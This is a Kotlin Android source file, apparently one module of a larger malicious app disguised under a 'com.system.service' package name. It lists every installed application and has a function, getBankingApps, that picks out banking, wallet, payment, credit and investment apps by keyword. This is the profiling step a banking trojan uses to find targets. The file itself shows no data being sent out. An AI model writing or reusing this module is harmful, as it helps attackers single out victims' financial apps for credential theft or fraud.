// [context: Kotlin, Android API 26+, installed app enumeration]
package com.system.service.modules.apps

import android.content.Context
import android.content.pm.PackageManager
import org.json.JSONArray
import org.json.JSONObject

class AppInventory(private val context: Context) {

    fun list(): JSONArray {
        val arr = JSONArray()
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (app in apps) {
            arr.put(JSONObject().apply {
                put("pkg", app.packageName)
                put("label", pm.getApplicationLabel(app).toString())
                put("version", try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_: Exception) { "" })
                put("system", (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                put("install_date", try { pm.getPackageInfo(app.packageName, 0).firstInstallTime } catch (_: Exception) { 0L })
            })
        }
        return arr
    }

    fun getBankingApps(): JSONArray {
        val all = list()
        val arr = JSONArray()
        val bankKeywords = listOf("bank", "finance", "wallet", "pay", "cash", "credit", "invest")
        for (i in 0 until all.length()) {
            val item = all.getJSONObject(i)
            val pkg = item.getString("pkg").lowercase()
            val label = item.getString("label").lowercase()
            if (bankKeywords.any { pkg.contains(it) || label.contains(it) }) arr.put(item)
        }
        return arr
    }
}
